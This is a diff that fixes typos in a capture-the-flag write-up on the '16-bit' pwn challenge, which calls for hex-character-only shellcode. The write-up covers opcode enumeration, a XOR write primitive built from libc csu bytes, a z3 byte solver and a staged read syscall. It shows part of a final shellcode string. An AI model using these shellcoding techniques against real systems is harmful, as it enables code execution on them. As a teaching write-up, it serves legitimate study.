@@ -6,16 +6,17 @@ Provided: chal + libc.so.6
 tl;dr: Xor the hell out of everything
 
 
-Disclaiminer: I did not solve this challenge during the CTF. After the CTF ended skimmed over these writeups and chatted with another solver. My approach was pretty simular to the second writeup.
+Disclaimer: I did not solve this challenge during the CTF. After the CTF ended skimmed over these writeups and chatted with another solver. My approach was pretty similar to the second writeup.
 
 https://github.com/knittingirl/CTF-Writeups/tree/main/pwn_challs/CyberOpen22/16-bit
+
 https://ctftime.org/writeup/34583
 
 
 
 <h2>Analysis</h2>
 
-This binary was very straight forward and the prompt hinted that this would be shellcoding with hex characters only.
+This binary was very straight forward and the prompt hinted that this would be shellcodeing with hex characters only.
 ```hlil
 int32_t main(int32_t argc, char** argv, char** envp)
     setup()
@@ -30,7 +31,7 @@ int32_t main(int32_t argc, char** argv, char** envp)
     noreturn
 ```
 
-Testing this by dumping random shellcode and it converts the bytes into the hex string varible of the input. One note was that the characters are upper case instead of lowercase
+Testing this by dumping random shellcode and it converts the bytes into the hex string variable of the input. One note was that the characters are upper case instead of lowercase
 
 ```python 
 [ins] In [3]: p.sendline(b'ABCDEF1337')
@@ -50,7 +51,7 @@ rbx: 0x0
 ```
 
 <h2>Valid Optcodes</h2>
-Since we have a rather limited charset of "0123456789ABCDEF" I wanted to know all possibel instructions using these optcodes. I noticed most of these were XOR instructions so wrote a script to get all possible permutations of these bytes. I then used the pwn.disasm module to disassemble them. One thing to note is that I padded it with a lot of nops so optcodes didn't collide with each other
+Since we have a rather limited charset of "0123456789ABCDEF" I wanted to know all possible instructions using these opcodes. I noticed most of these were XOR instructions so wrote a script to get all possible permutations of these bytes. I then used the pwn.disasm module to disassemble them. One thing to note is that I padded it with a lot of nops so opcodes didn't collide with each other
 ```python 
 from pwn import *
 from itertools import permutations
@@ -72,7 +73,7 @@ context.arch = 'amd64'
 print(disasm(optcodes))
 ```
 
-After running this script we got a gigantic file, using more filtering using grep I had a pretty good list of good optcodes. One thing to note is that from the other writeups it was pretty obvious that XOR was the way to win so I filtered out all the cmp, xchg and rex instructins.
+After running this script we got a gigantic file, using more filtering using grep I had a pretty good list of good opcodes. One thing to note is that from the other writeups it was pretty obvious that XOR was the way to win so I filtered out all the cmp, xchg and rex instructions.
 ```bash 
 python3 find_ops.py > optcodes
 grep -v 90 optcodes  > optcodes2
@@ -84,7 +85,7 @@ sort optcodes6 | uniq > optcodes7
 grep -v \* optcodes7 > optcodes8
 ```
 
-The overall idea of this challenge is to use XOR to set a registers to a write value and another one to a address to write. Using this write primative we can write stager shellcode that allows us to read in more data.
+The overall idea of this challenge is to use XOR to set a register to a write value and another one to an address to write. Using this write primitive we can write a stager shellcode that allows us to read in more shellcode.
 
 A major part of this challenge was reusing the registers that already existed, one thing to note is that on Ubuntu 22.04 the rbx value is NOT `__libc_csu_init`, instead its null. I know on remote this was true so I patched it using binja and gdb.
 
@@ -117,22 +118,22 @@ rdx->End
 
 
 
-The "null" instructins is effeclty a NOP if rax points to valid memory
+The "null" instructions is effectivley a NOP if rax points to valid memory
 `xor    byte ptr [rax], dh`
 
-Looking through the shellcode their is a lot of instructions in this shape, this could be used as a write.
+Looking through the shellcode there is a lot of instructions in this shape, this could be used as a write.
 `xor    DWORD PTR [rcx+0x43], eax`
 
-On top of that theirs are a lot of instructions to modify eax so I used that as the write value registers.
+On top of that, theirs are a lot of instructions to modify eax so I used that as the write value registers.
 
-Instead of setting up a register with a address to write to I this one as rdx is the end of our shellcode so + 0x30 should be a good spot.
+Instead of setting up a register with an address to write to I this one as rdx is the end of our shellcode so + 0x30 should be a good spot.
 `xor    DWORD PTR [rdx+0x30], eax`
 
 
-In order to modify the rax register their were direct XOR's but only in the allowed range. Using this range alone its impossible to generate the syscall instrction so we need more.
+To modify the rax register there were direct XOR's but only in the allowed range. Using this range alone it's impossible to generate the syscall instruction so we need more.
 `xor    DWORD PTR [rbx+0x30], eax`
 
-Rbx points to csu_init and their are instructions dereference it and xor with eax. 
+Rbx points to csu_init and there are instructions to dereference it and xor with eax. 
 `xor    eax, DWORD PTR [rbx+0x30]`
 
 
@@ -145,7 +146,7 @@ This means that we can also use bytes that are inside of csu_init
 0x55abcf455490: 0xe7 0x41 0xff 0x14
 ```
 
-Hence the write primative would look something like this
+Hence the write primitive would look something like this
 
 ```assembly 
 xor al, 0x41
@@ -154,9 +155,9 @@ xor BYTE PTR [rdx+ 0x30 ], al
 ```
 
 Out stager shellcode can be very short as most of the registers for a read syscall are already in place.
-Rsi is pointing to the shellcode buffuer, rdx is a pointing to the end so it a large amount for read count. We just need to null rdi, rax and call syscall for our final shellcode.
+Rsi is pointing to the shellcode buffer, rdx is pointing to the end so it a large amount for read count. We just need to null rdi, rax and call syscall for our final shellcode.
 
-Since rsi is already pointing to the shellcode buffer can just not touch it for the read syscall. Rdx points to the end so its already a bit number for read
+Since rsi is already pointing to the shellcode buffer can just not touch it for the read syscall. Rdx points to the end so it's already a big number for read count
 
 I had to keep in mind that we only have access to a certain range so used this to cycle through csu_init and grab only the bytes we have access to
 ```python 
@@ -167,14 +168,14 @@ for i in range(0x31, 0x50 ):
         csu.append(0)
 ```
 
-This gave us a pretty nice range of optcodes, in the end we had all of these
+This gave us a pretty nice range of opcodes, in the end, we had all of these
 
 ```python 
 csu = [0x74, 0x1B, 0x31, 0xDB, 0xF, 0x1F, 0x0, 0x4C, 0x89, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0xFF, 0x14, 0xDF, 0x48, 0x83, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0]
 opts= b"0123456789ABCDEF"
 ```
 
-Manually finding a valid combination to get shellcode bytes worried me but z3 came to the rescue, surpsingly this worked for all the bytes.
+Manually finding a valid combination to get shellcode bytes worried me but z3 came to the rescue, surprisingly this worked for all the bytes.
 ```python 
 import z3
 def find_valid(target : int):
@@ -193,20 +194,20 @@ def find_valid(target : int):
 ```
 
 
-With these two in hand we could construct shellcode that would xor the output from find_valid and then move it after the end of the shellcode. Hence after this setup it would have a fake nop sled until it hit our shellcode.
+With these two in hand, we could construct a shellcode that would xor the output from find_valid and then move it after the end of the shellcode. Hence after this setup, it would have a fake nop sled until it hit our shellcode.
 
 <h3>Things to Note:</h3>
 
-- Lists in python are 0 based, the indexs into the csu might be one off depending on how you add the values. Adding a 0 to pad the beigning of the csu array fixed this.
-- The original csu xor optocde didn't work as xoring eax would result in the upper bits of rax also getting nulled out. Without the upper bits of rax the nop sled would be invalid. Luckily the single byte version was also valid shellcode
+- Lists in python are 0-based, the indexes into the csu might be one-off depending on how you add the values. Adding a 0 to pad the beginning of the csu array fixed this.
+- The original csu xor optode didn't work as XORing eax would result in the upper bits of rax also getting nulled out. Without the upper bits of rax the nop sled would be invalid. Luckily the single byte version was also valid shellcode
 
     `xor eax, DWORD PTR [rbx+0x30]`
 
     `xor al, BYTE PTR [rbx+0x30]`
 
-- The read will read into the begining of our shellcode, so we need to have a nop sled so we overwrite the current RIP.
+- The read will read into the beginning of our shellcode, so we need to have a nop sled so we overwrite the current RIP.
 - After each write rax needs to be accounted for or cleared out, z3 either needs to know the old rax value or we could just rexor as x ^ y ^x ^y is still 0.
-- Using 0 as a padding in csu was a bad idea but hard coding in the csu index of null fixes this.
+- Using 0 as padding in csu was a bad idea but hard coding in the csu index of null fixes this.
 
 
 Final Shellcode
@@ -249,4 +250,4 @@ b"412C70B0412C72C22C40B12C22C42C14E0B22C14E2CB2C70B32CB2C749460B449464F4C0B54F4C
 ```
 
 NOTE:
-The orignal exploit use pinja a homebrew combination of pwn tools and binary ninja's debugger. Pwn2.py uses the regular version pwn tools.
+The original exploit use pinja a homebrew combination of pwn tools and binary ninja's debugger. Pwn2.py uses the regular version of pwn tools.
